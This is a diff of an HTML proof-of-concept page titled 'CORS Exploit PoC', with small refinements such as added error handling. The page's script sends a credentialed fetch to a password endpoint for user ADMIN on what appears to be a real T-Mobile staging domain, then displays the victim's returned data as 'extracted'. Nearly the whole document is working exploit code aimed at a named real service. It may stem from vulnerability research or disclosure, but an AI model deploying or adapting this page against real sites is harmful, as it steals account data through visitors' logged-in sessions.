@@ -1,27 +1,35 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+  <meta charset="UTF-8">
   <title>CORS Exploit PoC</title>
 </head>
 <body>
   <h2>CORS Exploit Demo</h2>
-  <div id="output">Waiting for response...</div>
+  <pre id="output">Waiting for response...</pre>
 
   <script>
-    var targetUrl = "https://appdevelopers-stg.t-mobile.com/user/password?name=ADMIN";
+    // Target endpoint that reflects arbitrary origins
+    const targetUrl = "https://appdevelopers-stg.t-mobile.com/user/password?name=ADMIN";
 
     fetch(targetUrl, {
       method: "GET",
       credentials: "include" // include victim's cookies/session
     })
-    .then(response => response.text())
+    .then(response => {
+      if (!response.ok) {
+        throw new Error("HTTP error " + response.status);
+      }
+      return response.text();
+    })
     .then(data => {
-      document.getElementById("output").innerText =
-        "Extracted sensitive response:\n\n" + data;
+      document.getElementById("output").textContent =
+        "Extracted response:\n\n" + data;
     })
     .catch(error => {
-      document.getElementById("output").innerText =
+      document.getElementById("output").textContent =
         "Exploit failed: " + error;
+      console.error("Fetch error:", error);
     });
   </script>
 </body>
